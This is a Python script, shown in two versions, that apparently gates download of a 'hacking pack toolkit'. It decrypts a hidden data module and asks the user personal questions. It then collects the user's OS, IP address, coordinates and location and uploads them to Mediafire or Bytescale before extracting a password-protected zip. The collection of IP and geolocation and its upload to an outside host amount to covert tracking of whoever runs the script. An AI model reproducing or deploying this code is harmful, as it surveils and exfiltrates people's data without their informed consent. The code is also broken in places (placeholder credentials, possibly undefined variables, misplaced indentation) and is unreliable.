'''
from Crypto.Cipher import AES
import hashlib
import os
import json
import zipfile
import requests

def decrypt_data(key, filename):
    chunksize = 65536
    outfile = filename[:-4]  # Remove ".enc" from filename
    with open(filename, "rb") as infile:
        iv = infile.read(16)
        hasher = hashlib.sha256(key.encode())
        key = hasher.digest()

        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(outfile, "wb") as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))


if __name__ == "__main__":
    key = input("Enter decryption key: ")
    decrypt_data(key, "data.py.enc")

    import data
    from datetime import datetime

    # Get user input
    name = input("What is your name? ")
    age = input("How old are you? ")
    location = input("Where are you from? ")
    reason = input("Why do you want to download this file? ")
    change = input("What would you like to change or how would you change ethically in the world of Cyberspace? ")

    # Collect data
    now = datetime.now()
    os_name = data.get_os_name()
    ip_address = data.get_ip_address()
    coordinates = data.get_coordinates()
    location_data = data.get_location_data()
    time = now.strftime("%Y-%m-%d %H:%M:%S")

    # Write data to JSON file
    data.write_data_to_json(name, age, location, reason, change, os_name, ip_address, coordinates, location_data, time, "track.json", "nissandiezonencaboagripoz9@gmail.com")

    # Authenticate with Mediafire
    consumer_key = "your_consumer_key_here"
    consumer_secret = "your_consumer_secret_here"

    response = requests.post(
        "https://www.mediafire.com/api/1.5/user/get_session_token.php",
        data={
            "email": "your_mediafire_email_here",
            "password": "your_mediafire_password_here",
            "application_id": consumer_key,
            "signature": hashlib.md5(f"{consumer_secret}email=your_mediafire_email_herepassword=your_mediafire_password_here{consumer_secret}".encode()).hexdigest()
        }
    )

    # Get session token from response
    response_json = response.json()
    if response_json["response"]["result"] == "MyAPI_Success":
        session_token = response_json["response"]["session_token"]
    else:
        print("Failed to get session token from Mediafire.")

    # Upload file to Mediafire using session token
    response = requests.post(
        "https://upload.mediafire.com/api/1.5/upload/simple.php",
        files={
            "file": open("track.json", "rb")
        },
        data={
            "session_token": session_token,
            "action_on_duplicate": "keep",
            "folder_key": "",
            "hash": "",
            "resumable": "no",
            "time": str(int(datetime.now().timestamp()))
        }
    )

    response_json = response.json()

    if response_json["response"]["result"] == "Upload_Success":
        mediafire_url = response_json['response']['action']['doupload']['url']  # URL of uploaded file in Mediafire
    else:
        print("Failed to upload file to Mediafire.")

    # Download Mediafire file for the first time
    response = requests.get(mediafire_url)

    # Unzip DownloadURL file with password protection
    with open("DownloadURL.zip", "wb") as f:
        f.write(response.content)

    zip_file = zipfile.ZipFile("DownloadURL.zip")
    zip_file.setpassword("felixultimatehackingpacktoolkit".encode())
    zip_file.extractall()
    zip_file.close()

    # Remove track.json and decrypted `data.py` file
    os.remove("track.json")
    os.remove("data.py")
'''
from Crypto.Cipher import AES
import hashlib
import os
import requests
import shutil
import data
import subprocess


def decrypt_data(key, filename):
    chunksize = 65536
    outfile = filename[:-4] # Remove ".enc" from filename
    with open(filename, "rb") as infile:
        iv = infile.read(16)
        hasher = hashlib.sha256(key.encode())
        key = hasher.digest()

        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(outfile, "wb") as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))


if __name__ == "__main__":
    key = input("Enter decryption key: ")
    decrypt_data(key, "data.py.enc")

    import data
    import zipfile
    from datetime import datetime

    # Get user input
    name = input("What is your name? ")
    age = input("How old are you? ")
    location = input("Where are you from? ")
    reason = input("Why do you want to download this file? ")
    change = input("What would you like to change or how would you change ethically in the world of Cyberspace? ")

    # Collect data
    now = datetime.now()
    os_name = data.get_os_name()
    ip_address = data.get_ip_address()
    coordinates = data.get_coordinates()
    location_data = data.get_location_data()
    time = now.strftime("%Y-%m-%d %H:%M:%S")

    # Write data to JSON file
    data.write_data_to_json(name, age, location, reason, change, os_name, ip_address, coordinates, location_data, time, "track.json", "sky20thepret@gmail.com")

    # Upload track.json file to Bytescale API
    url = "https://api.bytescale.com/v2/accounts/sample/uploads/binary"
    headers = {
        "Authorization": "Bearer public_your_api_key",
        "Content-Type": "text/plain"
    }
    filepath = "track.json"
    with open(filepath, "rb") as file:
        data = file.read()
    response = requests.post(url, headers=headers, data=data)

    if response.status_code == 200:
        print("Track file uploaded successfully.")
    else:
        print("Failed to upload file.")

    # Unzip DownloadURL file with password protection
if os.path.isfile("DownloadURL.zip"):
    print("Unzipping the file...")
    try:
        with zipfile.ZipFile("DownloadURL.zip", "r") as zip_obj:
            zip_obj.extractall(pwd=b"felixultimatehackingpacktoolkit")
            print("File successfully unzipped.")
    except Exception as e:
        print("Failed to unzip file:", e)
else:
    print("File not found.")

    # Remove decrypted `data.py` file
    os.remove("data.py")
